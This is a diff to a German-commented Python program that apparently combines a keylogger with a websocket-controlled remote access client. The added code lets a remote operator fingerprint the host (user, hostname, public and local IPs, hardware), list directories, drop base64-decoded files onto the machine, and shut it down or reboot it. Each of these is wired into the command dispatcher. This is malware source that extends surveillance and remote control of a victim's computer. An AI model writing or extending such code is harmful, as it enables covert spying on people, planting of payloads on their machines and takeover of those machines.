@@ -64,6 +64,62 @@ def send_ntfy_notification():
     except Exception as e:
         print(f"[!] Fehler beim Senden der NTFY-Benachrichtigung: {e}")
 
+def get_system_info():
+    try:
+        info = {
+            "Benutzer": os.getlogin(),
+            "Hostname": socket.gethostname(),
+            "OS": platform.platform(),
+            "Öffentliche IP": get_public_ip(),
+            "Lokale IPs": get_local_ips(),
+            "CPU": platform.processor(),
+            "Architektur": platform.machine(),
+            "Python-Version": platform.python_version(),
+            "Arbeitsspeicher (MB)": round(os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES') / (1024.**2), 2) if hasattr(os, 'sysconf') else "Unbekannt",
+            "Aktuelles Verzeichnis": os.getcwd(),
+        }
+        return "\n".join(f"{k}: {v}" for k, v in info.items())
+    except Exception as e:
+        return f"Fehler beim Abrufen der Systeminformationen: {e}"
+
+def list_directory(path="."):
+    try:
+        entries = os.listdir(path)
+        output = [f"Inhalt von {os.path.abspath(path)}:"]
+        for entry in entries:
+            full_path = os.path.join(path, entry)
+            if os.path.isdir(full_path):
+                output.append(f"[DIR]  {entry}")
+            else:
+                output.append(f"      {entry}")
+        return "\n".join(output)
+    except Exception as e:
+        return f"Fehler beim Auflisten des Verzeichnisses: {e}"
+
+def save_uploaded_file(filename, data_b64):
+    try:
+        with open(filename, "wb") as f:
+            f.write(base64.b64decode(data_b64))
+        return f"Datei erfolgreich gespeichert: {filename}"
+    except Exception as e:
+        return f"Fehler beim Speichern der Datei: {e}"
+
+def shutdown_or_restart(action):
+    try:
+        if platform.system() == "Windows":
+            if action == "shutdown":
+                os.system("shutdown /s /t 1")
+            elif action == "restart":
+                os.system("shutdown /r /t 1")
+        else:
+            if action == "shutdown":
+                os.system("shutdown now")
+            elif action == "restart":
+                os.system("reboot")
+        return f"System wird {action}..."
+    except Exception as e:
+        return f"Fehler beim {action}: {e}"
+
 # --- Keylogger-Funktionen ---
 def on_press_persistent(key):
     special_key_map = {
@@ -285,6 +341,25 @@ async def process_commands(websocket):
                 else:
                     response["status"] = "error"
                     response["error"] = "Datei nicht gefunden oder ist ein Verzeichnis."
+            
+            elif action == "upload":
+                filename = command.get("filename")
+                data_b64 = command.get("data")
+                response["type"] = "command_output"
+                response["output"] = save_uploaded_file(filename, data_b64)
+            
+            elif action == "ls":
+                path = command.get("path", ".")
+                response["type"] = "command_output"
+                response["output"] = list_directory(path)
+            
+            elif action == "systeminfo":
+                response["type"] = "command_output"
+                response["output"] = get_system_info()
+            
+            elif action in ("shutdown", "restart"):
+                response["type"] = "command_output"
+                response["output"] = shutdown_or_restart(action)
             
             elif action == "history":
                 limit = command.get("limit", 50)  # Standard: 50 Einträge
